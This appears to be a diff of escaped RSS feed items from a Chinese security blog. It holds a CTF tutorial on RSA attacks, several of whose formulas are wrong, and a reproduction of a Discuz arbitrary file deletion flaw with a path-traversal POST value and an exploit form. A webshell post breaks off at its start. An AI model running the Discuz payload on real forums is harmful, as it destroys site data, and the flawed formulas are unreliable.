+      g, y, x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; egcd(b &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; a, a)
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (g, x &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (b &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; a) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; y, y)
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;modinv&lt;/span&gt;(a, m):
+    g, x, y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; egcd(a, m)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; g &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exception&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;modular inverse does not exist&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; m
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;modinv函数即为求模拟的函数，在知道e，p，q的情况下，可以：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;d=modinv(e,(p-1)*(q-1))
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;即可求出解密密钥。&lt;/p&gt;
+&lt;p&gt;写到这里，要提出一个细节问题，在利用python进行rsa的题目求解过程中：&lt;/p&gt;
+&lt;p&gt;$c = m^e mod φ(n)$&lt;/p&gt;
+&lt;p&gt;​     此类运算需要使用pow函数来进行求解，而不是直接m**e % n，这样会慢死的。Python在处理此类运算进行了优化。比如刚才在已知p，q的时候利用modinv函数求出了d，然后就可以利用pow函数求出明文：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;m=pow(c,d,n)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;例题：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.jarvisoj.com&#34;&gt;https://www.jarvisoj.com&lt;/a&gt; (very easy RSA)&lt;/p&gt;
+&lt;p&gt;题目中直接给了p，q，e。&lt;/p&gt;
+&lt;p&gt;可以直接求出d：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3487583947589437589237958723892346254777&lt;/span&gt;
+q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8767867843568934765983476584376578389&lt;/span&gt;
+e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65537&lt;/span&gt;
+d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; modinv(e, (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(q&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;))
+&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; d
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;直接分解n&#34;&gt;直接分解n&lt;/h3&gt;
+&lt;p&gt;素数分解问题是困难的，但是可以通过计算机进行暴力分解。1999年，名为Cray的超级计算机用了5个月时间分解了512bit的n。2009年，一群研究人员成功分解了768bit的n。2010年，又提出了一些针对1024bit的n的分解的途径，但是没有正面分解成功。通常意义上来说，一般认为2048bit以上的n是安全的。现在一般的公钥证书都是4096bit的证书。&lt;/p&gt;
+&lt;p&gt;如果n比较小，那么可以通过工具进行直接n分解，从而得到私钥。如果n的大小小于256bit，那么我们通过本地工具即可爆破成功。例如采用windows平台的RSATool2v17，可以在几分钟内完成256bit的n的分解。&lt;/p&gt;
+&lt;p&gt;如果n在768bit或者更高，可以尝试使用一些在线的n分解网站，这些网站会存储一些已经分解成功的n，比如：
+&lt;a href=&#34;http://factordb.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://factordb.com&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;通过在此类网站上查询n，如果可以分解或者之前分解成功过，那么可以直接得到p和q。然后利用前述方法求解得到密文。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;题目识别&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;此类问题一般是分值较小的题目，提取出n之后可以发现n的长度小于等于512bit，可以直接取分解n。如果大于512bit，建议在使用每个题目都用后面所说的方法去解题。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;例题&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;比如在某次竞赛中，发现：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;n=87924348264132406875276140514499937145050893665602592992418171647042491658461
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;利用factordb分解：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;n = 275127860351348928173285174381581152299*319576316814478949870590164193048041239
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;利用公约数&#34;&gt;利用公约数&lt;/h3&gt;
+&lt;p&gt;如果在两次公钥的加密过程中使用的n1和n2具有相同的素因子，那么可以利用欧几里得算法直接将n1和n2分解。&lt;/p&gt;
+&lt;p&gt;通过欧几里得算法可以直接求出n1和n2的最大公约数p：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;gcd(n1,n2)=p
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以得出&lt;/p&gt;
+&lt;p&gt;$n1 = p&lt;em&gt;q_1$
+$n2 = p&lt;/em&gt;q_2$&lt;/p&gt;
+&lt;p&gt;直接分解成功。而欧几里得算法的时间复杂度为：O(log n)。这个时间复杂度即便是4096 bit也是秒破级别。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;gcd&lt;/span&gt;(a, b):
+   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; b:
+     a, b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; b, a
+   &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
+     temp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; b
+     a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; b
+     b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; temp
+   &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; a
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;题目识别&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;识别此类题目，通常会发现题目给了若干个n，均不相同，并且都是2048bit，4096bit级别，无法正面硬杠，并且明文都没什么联系，e也一般取65537。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;例题&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在一个题目中，你拿到了两个n，e都为65537，两个n分别为：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;n1=9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327
+n2=13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过直接分解，上factordb都分解失败。通过尝试发现：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;print gcd(n1,n2)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;打印出：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1564859779720039565508870182569324208117555667917997801104862601098933699462849007879184203051278194180664616470669559575370868384820368930104560074538872199213236203822337186927275879139590248731148622362880471439310489228147093224418374555428793546002109
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;则此致即为两个n共有的素因子p，然后进一步求出q，求解完毕。&lt;/p&gt;
+&lt;h3 id=&#34;fermat方法与pollard-rho方法&#34;&gt;Fermat方法与Pollard rho方法&lt;/h3&gt;
+&lt;p&gt;针对大整数的分解有很多种算法，性能上各有优异，有Fermat方法，Pollard rho方法，试除法，以及椭圆曲线法，连分数法，二次筛选法，数域分析法等等。其中一些方法应用在RSA的攻击上也有奇效。&lt;/p&gt;
+&lt;p&gt;在p，q的取值差异过大，或者p，q的取值过于相近的时候，Format方法与Pollard rho方法都可以很快将n分解成功。&lt;/p&gt;
+&lt;p&gt;此类分解方法有一个开源项目yafu将其自动化实现了，不论n的大小，只要p和q存在相差过大或者过近时，都可以通过yafu很快地分解成功。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;题目识别&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在直接分解n无望，不能利用公约数分解n之后，都应该使用yafu去试一下。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;例题&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.jarvisoj.com&#34;&gt;https://www.jarvisoj.com&lt;/a&gt; (Medium RSA)&lt;/p&gt;
+&lt;p&gt;此题首先从pem中提取N和e，然后上yafu，直接分解成功。&lt;/p&gt;
+&lt;h2 id=&#34;低加密指数攻击&#34;&gt;低加密指数攻击&lt;/h2&gt;
+&lt;p&gt;在RSA中e也称为加密指数。由于e是可以随意选取的，选取小一点的e可以缩短加密时间，但是选取不当的话，就会造成安全问题。&lt;/p&gt;
+&lt;h3 id=&#34;e3时的小明文攻击&#34;&gt;e=3时的小明文攻击&lt;/h3&gt;
+&lt;p&gt;当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。&lt;/p&gt;
+&lt;p&gt;即：&lt;/p&gt;
+&lt;p&gt;$c = m^e mod φ(n)$&lt;/p&gt;
+&lt;p&gt;如果e=3，且 m^e &amp;lt; n，那么：&lt;/p&gt;
+&lt;p&gt;$c = m^e$
+$e = 3$
+$m = \sqrt{3} c$&lt;/p&gt;
+&lt;p&gt;如果明文的三次方比n大，但是不是足够大，那么设k，有：&lt;/p&gt;
+&lt;p&gt;$c = m^e+kn$&lt;/p&gt;
+&lt;p&gt;爆破k，如果$c-kn$能开三次根式，那么可以直接得到明文。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;题目识别&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在e=3的时候首先尝试这种方法&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;例题&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.jarvisoj.com&#34;&gt;https://www.jarvisoj.com&lt;/a&gt; (Extremely hard RSA)&lt;/p&gt;
+&lt;p&gt;关键代码如下：此题通过不断给明文+n开三次方即可求得：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+   &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
+   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(gmpy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;root(c&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;N, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
+     &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; gmpy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;root(c&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;N, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
+     &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
+   i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;低加密指数广播攻击&#34;&gt;低加密指数广播攻击&lt;/h3&gt;
+&lt;p&gt;如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。&lt;/p&gt;
+&lt;p&gt;即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有：&lt;/p&gt;
+&lt;p&gt;$ c_1 = m^e$ $mod$ $n_1$&lt;/p&gt;
+&lt;p&gt;$c_2 = m^e$ $mod$ $n_2$&lt;/p&gt;
+&lt;p&gt;$ c_3 = m^e$ $mod$ $n_3$&lt;/p&gt;
+&lt;p&gt;对上述等式运用中国剩余定理，在e=3时，可以得到：&lt;/p&gt;
+&lt;p&gt;$ c_x =  m^3$ $mod$ $n_1n_2n_3$&lt;/p&gt;
+&lt;p&gt;通过对$ c_x $进行三次开方可以求得明文。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;题目识别&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;一般来说都是给了三组加密的参数和明密文，其中题目很明确地能告诉你这三组的明文都是一样的，并且e都取了一个较小的数字。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;例题：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;SCTF2016，CODE300&lt;/p&gt;
+&lt;p&gt;题目第二轮中通过流量包的方式给了广播攻击的参数。&lt;/p&gt;
+&lt;p&gt;直接给国外类似一题的网址：&lt;a href=&#34;http://codezen.fr/2014/01/16/hackyou-2014-crypto-400-cryptonet&#34;&gt;http://codezen.fr/2014/01/16/hackyou-2014-crypto-400-cryptonet&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;coppersmith定理攻击&#34;&gt;Coppersmith定理攻击&lt;/h3&gt;
+&lt;p&gt;Coppersmith定理指出在一个e阶的mod n多项式f(x)中，如果有一个根小于，就可以运用一个O(log n)的算法求出这些根。&lt;/p&gt;
+&lt;p&gt;Coppersmith定理指出在一个e阶的mod n多项式f(x)中，如果有一个根小于$ n^frac{1}{e} $，就可以运用一个O(log n)的算法求出这些根。&lt;/p&gt;
+&lt;p&gt;这个定理可以应用于RSA算法。如果e = 3并且在明文当中只有三分之二的比特是已知的，这种算法可以求出明文中所有的比特。&lt;/p&gt;
+&lt;p&gt;并未找到真题。&lt;/p&gt;
+&lt;h2 id=&#34;低解密指数攻击&#34;&gt;低解密指数攻击&lt;/h2&gt;
+&lt;p&gt;与低加密指数相同，低解密指数可以加快解密的过程，但是者也带来了安全问题。&lt;/p&gt;
+&lt;p&gt;那么一种基于连分数(一个数论当中的问题)的特殊攻击类型就可以危害RSA的安全。此时需要满足：&lt;/p&gt;
+&lt;p&gt;$q&amp;lt;$$p$$&amp;lt;2q$&lt;/p&gt;
+&lt;p&gt;如果满足上述条件，通过Wiener Attack可以在多项式时间中分解n。&lt;/p&gt;
+&lt;p&gt;rsa-wiener-attack的攻击源码开源在了github中，采取python编写，可以很容易使用。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;题目识别&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;e看起来很大就行了。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;例题&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;直接github用工具就行。&lt;a href=&#34;https://github.com/pablocelayes/rsa-wiener-attack&#34;&gt;https://github.com/pablocelayes/rsa-wiener-attack&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;这里注意一个细节问题，如果在运行脚本的时候报错，请在脚本前加上：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt;   sys
+sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setrecursionlimit(&lt;span style=&#34;color:#ae81ff&#34;&gt;10000000&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;共模攻击&#34;&gt;共模攻击&lt;/h2&gt;
+&lt;p&gt;如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。即：&lt;/p&gt;
+&lt;p&gt;$ c_1=m^{e_1}$ $mod$ $n$&lt;/p&gt;
+&lt;p&gt;$ c_2=m^{e_2}$ $mod$ $n$&lt;/p&gt;
+&lt;p&gt;即存在$ s_2 $，$ s_2 $使得：&lt;/p&gt;
+&lt;p&gt;$ s1^{e_1} + s2^{e_2} = 1 $&lt;/p&gt;
+&lt;p&gt;又因为&lt;/p&gt;
+&lt;p&gt;$ c_1= m^{e_1}$ $mod$ $n$&lt;/p&gt;
+&lt;p&gt;$ c_2 = m^{e_2}$ $mod$ $n$&lt;/p&gt;
+&lt;p&gt;明文解出。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;题目识别&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;非常简单，若干次加密，每次n都一样，明文根据题意也一样即可。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;例题&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.jarvisoj.com&#34;&gt;https://www.jarvisoj.com&lt;/a&gt; (very  hard RSA)&lt;/p&gt;
+&lt;p&gt;如果已知：n1，n2，c1，c2，e1，e2，并且其中n1=n2的话：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; egcd(e1, e2)
+ s1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
+ s2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]
+   &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; s
+ n&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;n1
+   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; s1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
+     s1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; s1
+     c1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; modinv(c1, n)
+   &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; s2&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
+     s2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; s2
+     c2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; modinv(c2, n)
+ m&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(pow(c1,s1,n)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;pow(c2,s2,n)) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
+    
+    <item>
+      <title>Discuz2.5-3.4任意文件操作漏洞</title>
+      <link>https://p0st3r.github.io/post/ssv-93588/</link>
+      <pubDate>Fri, 29 Sep 2017 00:00:00 +0000</pubDate>
+      <guid>https://p0st3r.github.io/post/ssv-93588/</guid>
+      <description>&lt;h2 id=&#34;简介&#34;&gt;简介&lt;/h2&gt;
+&lt;p&gt;Discuz!X社区软件，是一个采用 PHP 和 MySQL 等其他多种数据库构建的性能优异、功能全面、安全稳定的社区论坛平台。&lt;/p&gt;
+&lt;p&gt;2017年9月29日，Discuz!修复了一个安全问题用于加强安全性，这个漏洞会导致前台用户可以任意删除文件。&lt;/p&gt;
+&lt;p&gt;该漏洞于2014年6月被提交到 Wooyun漏洞平台，Seebug漏洞平台收录了该漏洞，漏洞编号 ssvid-93588。该漏洞通过配置属性值，导致任意文件删除。经过分析确认，原有的利用方式已经被修复，添加了对属性的 formtype 判断，但修复方式不完全导致可以绕过，通过模拟文件上传可以进入其他 unlink 条件，实现任意文件删除漏洞。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;影响版本： 2.5-3.4&lt;/li&gt;
+&lt;li&gt;修复方案:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a href=&#34;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574&#34;&gt;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;删除unlink相关代码。&lt;/p&gt;
+&lt;h2 id=&#34;原理&#34;&gt;原理&lt;/h2&gt;
+&lt;p&gt;核心问题在 ==upload/source/include/spacecp/spacecp_profile.php==&lt;/p&gt;
+&lt;p&gt;跟入代码70行,当提交 ==profilesubmit== 时进入判断，跟入177行&lt;/p&gt;
+&lt;p&gt;我们发现如果满足配置文件中某个==formtype==的类型为 ==file==，我们就可以进入判断逻辑，我们接着看这次修复的改动，可以发现228行再次引入语句 ==unlink==&lt;/p&gt;
+&lt;p&gt;当上传文件并上传成功，即可进入 unlink 语句&lt;/p&gt;
+&lt;p&gt;然后回溯变量==$space[$key]==,不难发现这就是用户的个人设置。&lt;/p&gt;
+&lt;p&gt;只要找到一个可以控制的变量即可，这里选择了 ==birthprovince。==&lt;/p&gt;
+&lt;p&gt;在设置页面直接提交就可以绕过字段内容的限制了。&lt;/p&gt;
+&lt;p&gt;成功实现了任意文件删除&lt;/p&gt;
+&lt;h2 id=&#34;复现&#34;&gt;复现&lt;/h2&gt;
+&lt;p&gt;环境：win7+phpstudy+discuz3.2&lt;/p&gt;
+&lt;p&gt;新建importantfile.txt作为测试&lt;/p&gt;
+&lt;p&gt;进入设置-个人资料，先在页面源代码找到formhash值&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&amp;amp;ac=profile
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://image.3001.net/images/20171005/15072139595386.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://image.3001.net/images/20171005/15072139935642.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到formhash值是b21b6577。&lt;/p&gt;
+&lt;p&gt;再访问&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&amp;amp;ac=profile&amp;amp;op=base
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Post数据：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;birthprovince=../../../importantfile.txt&amp;amp;profilesubmit=1&amp;amp;formhash=b21b6577
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如图&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://image.3001.net/images/20171005/15072146208123.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;执行后&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://image.3001.net/images/20171005/15072140283751.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;出生地被修改成要删除的文件。&lt;/p&gt;
+&lt;p&gt;最后构造表单执行删除文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;form action=”http://10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&amp;amp;ac=profile&amp;amp;op=base” method=”POST” enctype=”multipart/form-data”&amp;gt;
+
+&amp;lt;input type=”file” name=”birthprovince” id=”file” /&amp;gt;
+
+&amp;lt;input type=”text” name=”formhash” value=”b21b6577″/&amp;gt;&amp;lt;/p&amp;gt;
+
+&amp;lt;input type=”text” name=”profilesubmit” value=”1″/&amp;gt;&amp;lt;/p&amp;gt;
+
+&amp;lt;input type=”submit” value=”Submit” /&amp;gt;
+
+&amp;lt;/from&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;随便上传一张图片，即可删除importantfile.txt&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://image.3001.net/images/20171005/15072140588158.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;成功删除importantfile.txt&lt;/p&gt;
+&lt;h2 id=&#34;修复&#34;&gt;修复&lt;/h2&gt;
+&lt;p&gt;Discuz!X 的码云已经更新修复了该漏洞&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574&#34;&gt;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>一些脚本后门的分析、编写及绕过技巧</title>
+      <link>https://p0st3r.github.io/post/webshell-bypass-strategy/</link>
+      <pubDate>Sat, 20 May 2017 00:00:00 +0000</pubDate>
+      <guid>https://p0st3r.github.io/post/webshell-bypass-strategy/</guid>
+      <description>&lt;h2 id=&#34;0x00-php小马&#34;&gt;0x00 PHP小马&lt;/h2&gt;
+&lt;p&gt;表单中&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;action属性为要提交的地址；&lt;/li&gt;
+&lt;li&gt;PHP_SELF获取当前文件；&lt;/li&gt;
+&lt;li&gt;DOCUMENT_ROOT获取当前运行脚本所在的文档根目录；&lt;/li&gt;
+&lt;li&gt;textarea为多行文本输入框；&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?&lt;/span&gt;
